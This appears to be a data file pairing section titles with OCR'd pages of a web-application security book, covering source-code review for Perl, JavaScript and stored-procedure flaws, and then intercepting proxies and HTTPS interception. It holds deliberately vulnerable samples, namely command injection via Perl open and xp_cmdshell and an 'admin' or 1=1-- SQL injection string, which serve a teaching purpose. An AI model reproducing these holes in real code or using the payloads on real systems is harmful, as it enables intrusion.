c19.indd V2 - 08/11/2011 Page 737\nChapter 19 n Finding Vulnerabilities in Source Code 737\nFile Access\nThe following APIs can be used to access fi les in Perl:\nn open\nn sysopen\nThe open function reads and writes the contents of a specifi ed fi le. If user-\ncontrollable data is passed as the fi lename parameter, an attacker may be able\nto access arbitrary fi les on the server fi lesystem.\nFurthermore, if the fi lename parameter begins or ends with the pipe character,\nthe contents of this parameter are passed to a command shell. If an attacker\ncan inject data containing shell metacharacters such as the pipe or semicolon,\nhe may be able to perform arbitrary command execution. For example, in the\nfollowing code, an attacker can inject into the $useraddr parameter to execute\nsystem commands:\n$useraddr = $query->param(“useraddr”);\nopen (MAIL, “| /usr/bin/sendmail $useraddr”);\nprint MAIL “To: $useraddr\\n”;\n...\nDatabase Access\nThe selectall_arrayref function sends a query to a database and retrieves\nthe results as an array of arrays. The do function executes a query and simply\nreturns the number of rows affected. In both cases, the SQL statement is passed\nas a simple string.\nIf user-controllable input comprises part of the string parameter, the applica-\ntion is probably vulnerable to SQL injection. For example:\nmy $username = “admin’ or 1=1--”;\nmy $password = “foo”;\nmy $sql=”SELECT * FROM users WHERE username = ‘$username’ AND password =\n‘$password’”;\nmy $result = $db_connection->selectall_arrayref($sql)\nexecutes this unintended query:\nSELECT * FROM users WHERE username = ‘admin’ or 1=1--’\nAND password = ‘foo’\nThe functions prepare and execute can be used to create prepared state-\nments, allowing an application to create a SQL query containing parameter\ncc1199..iinndddd 773377 88//1199//22001111 1122::1188::3388 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 738\n738 Chapter 19 n Finding Vulnerabilities in Source Code\nplaceholders and set their values in a secure and type-safe way. If used as\nintended, this mechanism is not vulnerable to SQL injection. For example:\nmy $username = “admin’ or 1=1--”;\nmy $password = “foo”;\nmy $sql = $db_connection->prepare(“SELECT * FROM users\nWHERE username = ? AND password = ?”);\n$sql->execute($username, $password);\nresults in a query that is equivalent to the following:\nSELECT * FROM users WHERE username = ‘admin’’ or 1=1--’\nAND password = ‘foo’\nDynamic Code Execution\neval can be used to dynamically execute a string containing Perl code. The\nsemicolon delimiter can be used to batch multiple statements. If user-controllable\ndata is passed into this function, the application is probably vulnerable to script\ninjection.\nOS Command Execution\nThe following functions can be used to execute operating system commands:\nn system\nn exec\nn qx\nn The backtick operator (`)\nIn all these cases, commands can be chained together using the | character.\nIf user-controllable data is passed unfi ltered into any of these functions, the\napplication is probably vulnerable to arbitrary command execution.\nURL Redirection\nThe redirect function, which is a member of the CGI query object, takes a\nstring containing a relative or absolute URL, to which the user is redirected. If\nthe value of this string is user-controllable, the application is probably vulner-\nable to a phishing vector.\ncc1199..iinndddd 773388 88//1199//22001111 1122::1188::3388 PPMM"
  },
  {
    "input": "Configuring the Perl Environment",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 739\nChapter 19 n Finding Vulnerabilities in Source Code 739\nSockets\nAfter a socket is created using socket, it is connected to a remote host via a call\nto connect, which takes a sockaddr_in structure composed of the target’s host\nand port details. If this host information is user-controllable in any way, the\napplication may be exploitable to cause network connections to arbitrary hosts,\neither on the Internet or on the private DMZ or internal network on which the\napplication is hosted.\nConfi guring the Perl Environment\nPerl provides a taint mode that helps prevent user-supplied input from being\npassed to potentially dangerous functions. You can execute Perl programs in\ntaint mode by passing the -T fl ag to the Perl interpreter as follows:\n#!/usr/bin/perl -T\nWhen a program is running in taint mode, the interpreter tracks each item\nof input received from outside the program and treats it as tainted. If another\nvariable has its value assigned on the basis of a tainted item, it too is treated as\ntainted. For example:\n$path = “/home/pubs” # $path is not tainted\n$filename = param(“file”); # $filename is from request parameter and\n# is tainted\n$full_path = $path.$filename; # $full_path now tainted\nTainted variables cannot be passed to a range of powerful commands, includ-\ning eval,system,exec, and open. To use tainted data in sensitive operations,\nthe data must be “cleaned” by performing a pattern-matching operation and\nextracting the matched substrings. For example:\n$full_path =~ m/^([a-zA-Z1-9]+)$/; # match alphanumeric submatch\n# in $full_path\n$clean_full_path = $1; # set $clean_full_path to the\n# first submatch\n# $clean_full_path is untainted\nAlthough the taint mode mechanism is designed to help protect against many\nkinds of vulnerabilities, it is effective only if developers use appropriate regular\nexpressions when extracting clean data from tainted input. If an expression is\ntoo liberal and extracts data that may cause problems in the context in which it\ncc1199..iinndddd 773399 88//1199//22001111 1122::1188::3388 PPMM"
  },
  {
    "input": "JavaScript",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 740\n740 Chapter 19 n Finding Vulnerabilities in Source Code\nwill be used, the taint mode protection fails, and the application is still vulner-\nable. In effect, the taint mode mechanism reminds programmers to perform\nsuitable validation on all input before using it in dangerous operations. It cannot\nguarantee that the input validation implemented will be adequate.\nJavaScript\nClient-side JavaScript can, of course, be accessed without requiring any privi-\nleged access to the application, enabling you to perform a security-focused\ncode review in any situation. A key focus of this review is to identify any\nvulnerabilities such as DOM-based XSS, which are introduced on the client\ncomponent and leave users vulnerable to attack (see Chapter 12). A further\nreason for reviewing JavaScript is to understand what kinds of input valida-\ntion are implemented on the client, and also how dynamically generated user\ninterfaces are constructed.\nWhen reviewing JavaScript, you should be sure to include both .js fi les and\nscripts embedded in HTML content.\nThe key APIs to focus on are those that read from DOM-based data and that\nwrite to or otherwise modify the current document, as shown in Table 19-12.\nTable 19-12: JavaScript APIs That Read from DOM-Based Data\nAPI DESCRIPTION\ndocument.location Can be used to access DOM data that may be\ncontrollable via a crafted URL, and may there-\ndocument.URL\nfore represent an entry point for crafted data to\ndocument.URLUnencoded attack other application users.\ndocument.referrer\nwindow.location\ndocument.write() Can be used to update the document’s con-\ntents and to dynamically execute JavaScript\ndocument.writeln()\ncode. If attacker-controllable data is passed to\ndocument.body.innerHtml any of these APIs, this may provide a way to\nexecute arbitrary JavaScript within a victim’s\neval() browser.\nwindow.execScript()\nwindow.setInterval()\nwindow.setTimeout()\ncc1199..iinndddd 774400 88//1199//22001111 1122::1188::3388 PPMM"
  },
  {
    "input": "SQL Injection",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 741\nChapter 19 n Finding Vulnerabilities in Source Code 741\nDatabase Code Components\nWeb applications increasingly use databases for much more than passive data\nstorage. Today’s databases contain rich programming interfaces, enabling substan-\ntial business logic to be implemented within the database tier itself. Developers\nfrequently use database code components such as stored procedures, triggers,\nand user-defi ned functions to carry out key tasks. Therefore, when you review\nthe source code to a web application, you should ensure that all logic imple-\nmented in the database is included in the scope of the review.\nProgramming errors in database code components can potentially result in\nany of the various security defects described in this chapter. In practice, how-\never, you should watch for two main areas of vulnerabilities. First, database\ncomponents may themselves contain SQL injection fl aws. Second, user input\nmay be passed to potentially dangerous functions in unsafe ways.\nSQL Injection\nChapter 9 described how prepared statements can be used as a safe alternative\nto dynamic SQL statements to prevent SQL injection attacks. However, even if\nprepared statements are properly used throughout the web application’s own\ncode, SQL injection fl aws may still exist if database code components construct\nqueries from user input in an unsafe manner.\nThe following is an example of a stored procedure that is vulnerable to SQL\ninjection in the @name parameter:\nCREATE PROCEDURE show_current_orders\n(@name varchar(400) = NULL)\nAS\nDECLARE @sql nvarchar(4000)\nSELECT @sql = ‘SELECT id_num, searchstring FROM searchorders WHERE ‘ +\n‘searchstring = ‘’’ + @name + ‘’’’;\nEXEC (@sql)\nGO\nEven if the application passes the user-supplied name value to the stored\nprocedure in a safe manner, the procedure itself concatenates this directly into\na dynamic query and therefore is vulnerable.\nDifferent database platforms use different methods to perform dynamic\nexecution of strings containing SQL statements. For example:\nn MS-SQL — EXEC\nn Oracle — EXECUTE IMMEDIATE\ncc1199..iinndddd 774411 88//1199//22001111 1122::1188::3399 PPMM"
  },
  {
    "input": "Calls to Dangerous Functions",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 742\n742 Chapter 19 n Finding Vulnerabilities in Source Code\nn Sybase — EXEC\nn DB2 — EXEC SQL\nAny appearance of these expressions within database code components should\nbe closely reviewed. If user input is being used to construct the SQL string, the\napplication may be vulnerable to SQL injection.\nNOTE On Oracle, stored procedures by default run with the permissions of\nthe defi ner, rather than the invoker (as with SUID programs on UNIX). Hence,\nif the application uses a low-privileged account to access the database, and\nstored procedures were created using a DBA account, a SQL injection fl aw\nwithin a procedure may enable you to escalate privileges and perform arbi-\ntrary database queries.\nCalls to Dangerous Functions\nCustomized code components such as stored procedures are often used to per-\nform unusual or powerful actions. If user-supplied data is passed to a potentially\ndangerous function in an unsafe way, this may lead to various kinds of vulner-\nabilities, depending on the nature of the function. For example, the following\nstored procedure is vulnerable to command injection in the @loadfile and\n@loaddir parameters:\nCreate import_data (@loadfile varchar(25), @loaddir varchar(25) )\nas\nbegin\nselect @cmdstring = “$PATH/firstload “ + @loadfile + “ “ + @loaddir\nexec @ret = xp_cmdshell @cmdstring\n...\n...\nEnd\nThe following functions may be potentially dangerous if invoked in an\nunsafe way:\nn Powerful default stored procedures in MS-SQL and Sybase that allow\nexecution of commands, registry access, and so on\nn Functions that provide access to the fi lesystem\nn User-defi ned functions that link to libraries outside the database\nn Functions that result in network access, such as through OpenRowSet in\nMS-SQL or a database link in Oracle\ncc1199..iinndddd 774422 88//1199//22001111 1122::1188::3399 PPMM"
  },
  {
    "input": "Tools for Code Browsing",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 743\nChapter 19 n Finding Vulnerabilities in Source Code 743\nTools for Code Browsing\nThe methodology we have described for performing a code review essentially\ninvolves reading the source code and searching for patterns indicating the\ncapture of user input and the use of potentially dangerous APIs. To carry out\na code review effectively, it is preferable to use an intelligent tool to browse the\ncodebase. You need a tool that understands the code constructs in a particular\nlanguage, provides contextual information about specifi c APIs and expressions,\nand facilitates your navigation.\nIn many languages, you can use one of the available development studios,\nsuch as Visual Studio, NetBeans, or Eclipse. In addition, various generic code-\nbrowsing tools support numerous languages and are optimized for viewing\nof code rather than development. The authors’ preferred tool is Source Insight,\nshown in Figure 19-1. It supports easy browsing of the source tree, a versatile\nsearch function, a preview pane to display contextual information about any\nselected expression, and speedy navigation through the codebase.\nFigure 19-1: Source Insight being used to search and browse the source code for a\nweb application\ncc1199..iinndddd 774433 88//1199//22001111 1122::1188::3399 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 744\n744 Chapter 19 n Finding Vulnerabilities in Source Code\nSummary\nMany people who have substantial experience with testing web applications\ninteractively, exhibit an irrational fear of looking inside an application’s codebase\nto discover vulnerabilities directly. This fear is understandable for people who\nare not programmers, but it is rarely justifi ed. Anyone who is familiar with\ndealing with computers can, with a little investment, gain suffi cient knowledge\nand confi dence to perform an effective code audit. Your objective in review-\ning an application’s codebase need not be to discover “all” the vulnerabilities\nit contains, any more than you would set yourself this unrealistic goal when\nperforming hands-on testing. More reasonably, you can aspire to understand\nsome of the key processing that the application performs on user-supplied input\nand recognize some of the signatures that point toward potential problems.\nApproached in this way, code review can be an extremely useful complement\nto the more familiar black-box testing. It can improve the effectiveness of that\ntesting and reveal defects that may be extremely diffi cult to discover when you\nare dealing with an application entirely from the outside.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. List three categories of common vulnerabilities that often have easily\nrecognizable signatures within source code.\n2. Why can identifying all sources of user input sometimes be challenging\nwhen reviewing a PHP application?\n3. Consider the following two methods of performing a SQL query that\nincorporates user-supplied input:\n// method 1\nString artist = request.getParameter(“artist”).replaceAll(“’”, “’’”);\nString genre = request.getParameter(“genre”).replaceAll(“’”, “’’”);\nString album = request.getParameter(“album”).replaceAll(“’”, “’’”);\nStatement s = connection.createStatement();\ns.executeQuery(“SELECT * FROM music WHERE artist = ‘” + artist +\n‘” AND genre = ‘” + genre + ‘” AND album = ‘” + album + “’”);\n// method 2\nString artist = request.getParameter(“artist”);\nString genre = request.getParameter(“genre”);\nString album = request.getParameter(“album”);\nStatement s = connection.prepareStatement(\n“SELECT * FROM music WHERE artist = ‘” + artist +\n“’ AND genre = ? AND album = ?”);\ncc1199..iinndddd 774444 88//1199//22001111 1122::1188::3399 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 745\nChapter 19 n Finding Vulnerabilities in Source Code 745\ns.setString(1, genre);\ns.setString(2, album);\ns.executeQuery();\nWhich of these methods is more secure, and why?\n4. You are reviewing the codebase of a Java application. During initial recon-\nnaissance, you search for all uses of the HttpServletRequest.getParameter\nAPI. The following code catches your eye:\nprivate void setWelcomeMessage(HttpServletRequest request) throws\nServletException\n{\nString name = request.getParameter(“name”);\nif (name == null)\nname = “”;\nm_welcomeMessage = “Welcome “ + name +”!”;\n}\nWhat possible vulnerability might this code indicate? What further code\nanalysis would you need to perform to confi rm whether the application\nis indeed vulnerable?\n5. You are reviewing the mechanism that an application uses to generate\nsession tokens. The relevant code is as follows:\npublic class TokenGenerator\n{\nprivate java.util.Random r = new java.util.Random();\npublic synchronized long nextToken()\n{\nlong l = r.nextInt();\nlong m = r.nextInt();\nreturn l + (m << 32);\n}\n}\nAre the application’s session tokens being generated in a predictable way?\nExplain your answer fully.\ncc1199..iinndddd 774455 88//1199//22001111 1122::1188::3399 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 746\ncc1199..iinndddd 774466 88//1199//22001111 1122::1188::3399 PPMM"
  },
  {
    "input": "Chapter 20 A Web Application Hacker’s Toolkit",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 747\nCHAPTER\n20\nA Web Application\nHacker’s Toolkit\nSome attacks on web applications can be performed using only a standard web\nbrowser; however, the majority of them require you to use some additional tools.\nMany of these tools operate in conjunction with the browser, either as exten-\nsions that modify the browser’s own functionality, or as external tools that run\nalongside the browser and modify its interaction with the target application.\nThe most important item in your toolkit falls into this latter category. It oper-\nates as an intercepting web proxy, enabling you to view and modify all the\nHTTP messages passing between your browser and the target application. Over\nthe years, basic intercepting proxies have evolved into powerful integrated tool\nsuites containing numerous other functions designed to help you attack web\napplications. This chapter examines how these tools work and describes how\nyou can best use their functionality.\nThe second main category of tool is the standalone web application scanner.\nThis product is designed to automate many of the tasks involved in attacking a\nweb application, from initial mapping to probing for vulnerabilities. This chapter\nexamines the inherent strengths and weaknesses of standalone web application\nscanners and briefl y looks at some current tools in this area.\nFinally, numerous smaller tools are designed to perform specifi c tasks when\ntesting web applications. Although you may use these tools only occasionally,\nthey can prove extremely useful in particular situations.\n747\ncc2200..iinndddd 774477 88//1199//22001111 1122::2211::0044 PPMM"
  },
  {
    "input": "Internet Explorer",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 748\n748 Chapter 20 n A Web Application Hacker’s Toolkit\nWeb Browsers\nA web browser is not exactly a hack tool, as it is the standard means by which\nweb applications are designed to be accessed. Nevertheless, your choice of\nweb browser may have an impact on your effectiveness when attacking a web\napplication. Furthermore, various extensions are available to different types of\nbrowsers, which can help you carry out an attack. This section briefl y exam-\nines three popular browsers and some of the extensions available for them.\nInternet Explorer\nMicrosoft’s Internet Explorer (IE) has for many years been the most widely\nused web browser. It remains so by most estimates, capturing approximately\n45% of the market. Virtually all web applications are designed for and tested\non current versions of IE. This makes IE a good choice for an attacker, because\nmost applications’ content and functionality are displayed correctly and can be\nused properly within IE. In particular, other browsers do not natively support\nActiveX controls, making IE mandatory if an application employs this technol-\nogy. One restriction imposed by IE is that you are restricted to working with\nthe Microsoft Windows platform.\nBecause of IE’s widespread adoption, when you are testing for cross-site\nscripting and other attacks against application users, you should always try to\nmake your attacks work against this browser if possible (see Chapter 12).\nNOTE Internet Explorer 8 introduced an anti-XSS fi lter that is enabled by\ndefault. As described in Chapter 12, this fi lter attempts to block most standard\nXSS attacks from executing and therefore causes problems when you are test-\ning XSS exploits against a target application. Normally you should disable the\nXSS fi lter while testing. Ideally, when you have confi rmed an XSS vulnerability,\nyou should then reenable the fi lter and see whether you can fi nd a way to\nbypass the fi lter using the vulnerability you have found.\nVarious useful extensions are available to IE that may be of assistance when\nattacking web applications, including the following:\nn HttpWatch, shown in Figure 20-1, analyzes all HTTP requests and responses,\nproviding details of headers, cookies, URLs, request parameters, HTTP\nstatus codes, and redirects.\nn IEWatch performs similar functions to HttpWatch. It also does some\nanalysis of HTML documents, images, scripts, and the like.\ncc2200..iinndddd 774488 88//1199//22001111 1122::2211::0044 PPMM"
  },
  {
    "input": "Firefox",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 749\nChapter 20 n A Web Application Hacker’s Toolkit 749\nFigure 20-1: HttpWatch analyzes the HTTP requests issued by Internet Explorer\nFirefox\nFirefox is currently the second most widely used web browser. By most esti-\nmates it makes up approximately 35% of the market. The majority of web\napplications work correctly on Firefox; however, it has no native support for\nActiveX controls.\nThere are many subtle variations among different browsers’ handling of\nHTML and JavaScript, particularly when they do not strictly comply with the\nstandards. Often, you will fi nd that an application’s defenses against bugs\nsuch as cross-site scripting mean that your attacks are not effective against\nevery browser platform. Firefox’s popularity is suffi cient that Firefox-specifi c\nXSS exploits are perfectly valid, so you should test these against Firefox if you\nencounter diffi culties getting them to work against IE. Also, features specifi c to\nFirefox have historically allowed a range of attacks to work that are not possible\nagainst IE, as described in Chapter 13.\ncc2200..iinndddd 774499 88//1199//22001111 1122::2211::0044 PPMM"
  },
  {
    "input": "Chrome",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 750\n750 Chapter 20 n A Web Application Hacker’s Toolkit\nA large number of browser extensions are available for Firefox that may be\nuseful when attacking web applications, including the following:\nn HttpWatch is also available for Firefox.\nn FoxyProxy enables fl exible management of the browser’s proxy confi gu-\nration, allowing quick switching, setting of different proxies for different\nURLs, and so on.\nn LiveHTTPHeaders lets you modify requests and responses and replay\nindividual requests.\nn PrefBar allows you to enable and disable cookies, allowing quick access\ncontrol checks, as well as switching between different proxies, clearing\nthe cache, and switching the browser’s user agent.\nn Wappalyzer uncovers technologies in use on the current page, showing\nan icon for each one found in the URL bar.\nn The Web Developer toolbar provides a variety of useful features. Among\nthe most helpful are the ability to view all links on a page, alter HTML\nto make form fi elds writable, remove maximum lengths, unhide hidden\nform fi elds, and change a request method from GET to POST.\nChrome\nChrome is a relatively new arrival on the browser scene, but it has rapidly gained\npopularity, capturing approximately 15% of the market.\nA number of browser extensions are available for Chrome that may be useful\nwhen attacking web applications, including the following:\nn XSS Rays is an extension that tests for XSS vulnerabilities and allows\nDOM inspection.\nn Cookie editor allows in-browser viewing and editing of cookies.\nn Wappalyzer is also available for Chrome.\nn The Web Developer Toolbar is also available for Chrome.\nChrome is likely to contain its fair share of quirky features that can be used\nwhen constructing exploits for XSS and other vulnerabilities. Because Chrome\nis a relative newcomer, these are likely to be a fruitful target for research in the\ncoming years.\ncc2200..iinndddd 775500 88//1199//22001111 1122::2211::0055 PPMM"
  },
  {
    "input": "How the Tools Work",
    "output": "Stuttard c20.indd V3 - 08/16/2011 Page 751\nChapter 20 n A Web Application Hacker’s Toolkit 751\nIntegrated Testing Suites\nAfter the essential web browser, the most useful item in your toolkit when\nattacking a web application is an intercepting proxy. In the early days of web\napplications, the intercepting proxy was a standalone tool that provided minimal\nfunctionality. The venerable Achilles proxy simply displayed each request and\nresponse for editing. Although it was extremely basic, buggy, and a headache\nto use, Achilles was suffi cient to compromise many a web application in the\nhands of a skilled attacker.\nOver the years, the humble intercepting proxy has evolved into a number\nof highly functional tool suites, each containing several interconnected tools\ndesigned to facilitate the common tasks involved in attacking a web application.\nSeveral testing suites are commonly used by web application security testers:\nn Burp Suite\nn WebScarab\nn Paros\nn Zed Attack Proxy\nn Andiparos\nn Fiddler\nn CAT\nn Charles\nThese toolkits differ widely in their capabilities, and some are newer and\nmore experimental than others. In terms of pure functionality, Burp Suite is\nthe most sophisticated, and currently it is the only toolkit that contains all the\nfunctionality described in the following sections. To some extent, which tools\nyou use is a matter of personal preference. If you do not yet have a preference,\nwe recommend that you download and use several of the suites in a real-world\nsituation and establish which best meets your needs.\nThis section examines how the tools work and describes the common work\nfl ows involved in making the best use of them in your web application testing.\nHow the Tools Work\nEach integrated testing suite contains several complementary tools that share\ninformation about the target application. Typically, the attacker engages with the\ncc2200..iinndddd 775511 88//1199//22001111 1122::2211::0055 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 752\n752 Chapter 20 n A Web Application Hacker’s Toolkit\napplication in the normal way via his browser. The tools monitor the resulting\nrequests and responses, storing all relevant details about the target application\nand providing numerous useful functions. The typical suite contains the fol-\nlowing core components:\nn An intercepting proxy\nn A web application spider\nn A customizable web application fuzzer\nn A vulnerability scanner\nn A manual request tool\nn Functions for analyzing session cookies and other tokens\nn Various shared functions and utilities\nIntercepting Proxies\nThe intercepting proxy lies at the heart of the tool suite and remains today the\nonly essential component. To use an intercepting proxy, you must confi gure\nyour browser to use as its proxy server a port on the local machine. The proxy\ntool is confi gured to listen on this port and receives all requests issued by the\nbrowser. Because the proxy has access to the two-way communications between\nthe browser and the destination web server, it can stall each message for review\nand modifi cation by the user and perform other useful functions, as shown in\nFigure 20-2.\nConfiguring Your Browser\nIf you have never set up your browser to use a proxy server, this is easy to do on\nany browser. First, establish which local port your intercepting proxy uses by\ndefault to listen for connections (usually 8080). Then follow the steps required\nfor your browser:\nÿ ÿ ÿ\nn In Internet Explorer, select Tools Internet Options Connections\nLAN settings. Ensure that the “Automatically detect settings” and “Use\nautomatic confi guration script” boxes are not checked. Ensure that the “Use\na proxy server for your LAN” box is checked. In the Address fi eld, enter\n127.0.0.1, and in the Port fi eld, enter the port used by your proxy. Click\nthe Advanced button, and ensure that the “Use the same proxy server for\nall protocols” box is checked. If the hostname of the application you are\nattacking matches any of the expressions in the “Do not use proxy server\ncc2200..iinndddd 775522 88//1199//22001111 1122::2211::0055 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 753\nChapter 20 n A Web Application Hacker’s Toolkit 753\nfor addresses beginning with” box, remove these expressions. Click OK\nin all the dialogs to confi rm the new confi guration.\nÿ ÿ ÿ ÿ\nn In Firefox, select Tools Options Advanced Network Settings.\nEnsure that the Manual Proxy Confi guration option is selected. In the HTTP\nProxy fi eld, enter 127.0.0.1, and in the adjacent Port fi eld, enter the port\nused by your proxy. Ensure that the “Use this proxy server for all proto-\ncols” box is checked. If the hostname of the application you are attacking\nmatches any of the expressions in the “No proxy for” box, remove these\nexpressions. Click OK in all the dialogs to confi rm the new confi guration.\nn Chrome uses the proxy settings from the native browser that ships with\nthe operating system on which it is running. You can access these set-\nÿ ÿ\ntings via Chrome by selecting Options Under the Bonnet Network\nÿ\nChange Proxy Settings.\nFigure 20-2: Editing an HTTP request on-the-fly using an intercepting proxy\ncc2200..iinndddd 775533 88//1199//22001111 1122::2211::0055 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 754\n754 Chapter 20 n A Web Application Hacker’s Toolkit\nWORKING WITH NON-PROXY-AWARE CLIENTS\nOccasionally, you may fi nd yourself testing applications that use a thick cli-\nent that runs outside of the browser. Many of these clients do not offer any\nsettings to confi gure an HTTP proxy; they simply attempt to connect directly\nto the web server hosting the application. This behavior prevents you from\nsimply using an intercepting proxy to view and modify the application’s\ntraffi c.\nFortunately, Burp Suite offers some features that let you continue working\nin this situation. To do so, you need to follow these steps:\n1. Modify your operating system hosts file to resolve the hostnames used by\nthe application to your loopback address (127.0.0.1). For example:\n127.0.0.1 www.wahh-app.com\nThis causes the thick client’s requests to be redirected to your own\ncomputer.\n2. For each destination port used by the application (typically 80 and 443),\nconfigure a Burp Proxy listener on this port of your loopback interface,\nand set the listener to support invisible proxying. The invisible proxying\nfeature means that the listener will accept the non-proxy-style requests\nsent by the thick client, which have been redirected to your loopback\naddress.\n3. Invisible mode proxying supports both HTTP and HTTPS requests. To pre-\nvent fatal certificate errors with SSL, it may be necessary to configure your\ninvisible proxy listener to present an SSL certificate with a specific host-\nname which matches what the thick client expects. The following section\nhas details on how you can avoid certificate problems caused by inter-\ncepting proxies.\n4. For each hostname you have redirected using your hosts file, configure\nBurp to resolve the hostname to its original IP address. These settings\nÿ ÿ\ncan be found under Options Connections Hostname Resolution.\nThey let you specify custom mappings of domain names to IP addresses\nto override your computer’s own DNS resolution. This causes the outgo-\ning requests from Burp to be directed to the correct destination server.\n(Without this step, the requests would be redirected to your own com-\nputer in an infinite loop.)\ncc2200..iinndddd 775544 88//1199//22001111 1122::2211::0055 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 755\nChapter 20 n A Web Application Hacker’s Toolkit 755\nWORKING WITH NON-PROXY-AWARE CLIENTS\n5. When operating in invisible mode, Burp Proxy identifies the destina-\ntion host to which each request should be forwarded using the Host\nheader that appears in requests. If the thick client you are testing does\nnot include a Host header in requests, Burp cannot forward requests cor-\nrectly. If you are dealing with only one destination host, you can work\naround this problem by configuring the invisible proxy listener to redirect\nall its requests to the required destination host. If you are dealing with\nmultiple destination hosts, you probably need to run multiple instances\nof Burp on multiple machines and use your hosts file to redirect traffic for\neach destination host to a different intercepting machine.\nIntercepting Proxies and HTTPS\nWhen dealing with unencrypted HTTP communications, an intercepting proxy\nfunctions in essentially the same way as a normal web proxy, as described in\nChapter 3. The browser sends standard HTTP requests to the proxy, with the\nexception that the URL in the fi rst line of the request contains the full hostname\nof the destination web server. The proxy parses this hostname, resolves it to\nan IP address, converts the request to its standard nonproxy equivalent, and\nforwards it to the destination server. When that server responds, the proxy\nforwards the response back to the client browser.\nFor HTTPS communications, the browser fi rst makes a cleartext request to\nthe proxy using the CONNECT method, specifying the hostname and port of the\ndestination server. When a normal (nonintercepting) proxy is used, the proxy\nresponds with an HTTP 200 status code and keeps the TCP connection open.\nFrom that point onward (for that connection) the proxy acts as a TCP-level relay\nto the destination server. The browser then performs an SSL handshake with\nthe destination server, setting up a secure tunnel through which to pass HTTP\nmessages. With an intercepting proxy, this process must work differently so\nthat the proxy can gain access to the HTTP messages that the browser sends\nthrough the tunnel. As shown in Figure 20-3, after responding to the CONNECT\nrequest with an HTTP 200 status code, the intercepting proxy does not act as\na relay but instead performs the server’s end of the SSL handshake with the\nbrowser. It also acts as an SSL client and performs a second SSL handshake with\nthe destination web server. Hence, two SSL tunnels are created, with the proxy\nacting as a middleman. This enables the proxy to decrypt each message received\ncc2200..iinndddd 775555 88//1199//22001111 1122::2211::0055 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 756\n756 Chapter 20 n A Web Application Hacker’s Toolkit\nthrough either tunnel, gain access to its cleartext form, and then reencrypt it\nfor transmission through the other tunnel.\nAttacker Internet Target\nCONNECT wahh-app:433\n200 Connection established\nIntercepting proxy\nSSL tunnel 1 SSL tunnel 2\nGET / HTTP/1.1\n1101001000100 User-Agent: Mozilla/ 1001001101000\n11010100000... 4.0 (compatible; MSIE 10001001001...\n7.0; Windows NT 5.1)\nHost: wahh-app.com\n...\nHTTP/1.1 200 OK\n1100100110010 Content-Type: text/ 0010010100001\n01010101110... html 01111010100...\nContent-Length:\n24246\n<html><head>...\nFigure 20-3: An intercepting proxy lets you view and modify HTTPS communications\nOf course, if any suitably positioned attacker could perform this trick with-\nout detection, SSL would be fairly pointless, because it would not protect the\nprivacy and integrity of communications between the browser and server. For\nthis reason, a key part of the SSL handshake involves using cryptographic\ncertifi cates to authenticate the identity of either party. To perform the server’s\nend of the SSL handshake with the browser, the intercepting proxy must use\nits own SSL certifi cate, because it does not have access to the private key used\nby the destination server.\nIn this situation, to protect against attacks, browsers warn the user, allowing\nher to view the spurious certifi cate and decide whether to trust it. Figure 20-4\nshows the warning presented by IE. When an intercepting proxy is being used,\nboth the browser and proxy are fully under the attacker’s control, so he can\naccept the spurious certifi cate and allow the proxy to create two SSL tunnels.\nWhen you are using your browser to test an application that uses a single\ndomain, handling the browser security warning and accepting the proxy’s\ncc2200..iinndddd 775566 88//1199//22001111 1122::2211::0055 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 757\nChapter 20 n A Web Application Hacker’s Toolkit 757\nhomegrown certifi cate in this way normally is straightforward. However, in\nother situations you may still encounter problems. Many of today’s applica-\ntions involve numerous cross-domain requests for images, script code, and\nother resources. When HTTPS is being used, each request to an external\ndomain causes the browser to receive the proxy’s invalid SSL certifi cate. In\nthis situation, browsers usually do not warn the user and thus do not give\nher the option to accept the invalid SSL certifi cate for each domain. Rather,\nthey typically drop the cross-domain requests, either silently or with an alert\nstating that this has occurred.\nFigure 20-4: Using an intercepting proxy with HTTPS communications generates a\nwarning in the attacker’s browser\nAnother situation in which the proxy’s homegrown SSL certifi cates can cause\nproblems is when you use a thick client running outside the browser. Normally,\nthese clients simply fail to connect if an invalid SSL certifi cate is received and\nprovide no way to accept the certifi cate.\nFortunately, there is a simple way to circumvent these problems. On instal-\nlation, Burp Suite generates a unique CA certifi cate for the current user and\nstores this on the local machine. When Burp Proxy receives an HTTPS request\nto a new domain, it creates a new host certifi cate for this domain on-the-fl y and\nsigns it using the CA certifi cate. This means that the user can install Burp’s CA\ncertifi cate as a trusted root in her browser (or other trust store). All the result-\ning per-host certifi cates are accepted as valid, thereby removing all SSL errors\ncaused by the proxy.\ncc2200..iinndddd 775577 88//1199//22001111 1122::2211::0066 PPMM\nStuttard c20.indd V3 - 08/16/2011 Page 758\n758 Chapter 20 n A Web Application Hacker’s Toolkit\nThe precise method for installing the CA certifi cate depends on the browser\nand platform. Essentially it involves the following steps:\n1. Visit any HTTPS URL with your browser via the proxy.\n2. In the resulting browser warning, explore the certifi cate chain, and select\nthe root certifi cate in the tree (called PortSwigger CA).\n3. Import this certifi cate into your browser as a trusted root or certifi cate\nauthority. Depending on your browser, you may need to fi rst export the\ncertifi cate and then import it in a separate operation.\nDetailed instructions for installing Burp’s CA certifi cate on different browsers\nare contained in the online Burp Suite documentation at the following URL:\nhttp://portswigger.net/burp/help/servercerts.html\nCommon Features of Intercepting Proxies\nIn addition to their core function of allowing interception and modifi cation of\nrequests and responses, intercepting proxies typically contain a wealth of other\nfeatures to help you attack web applications:\nn Fine-grained interception rules, allowing messages to be intercepted 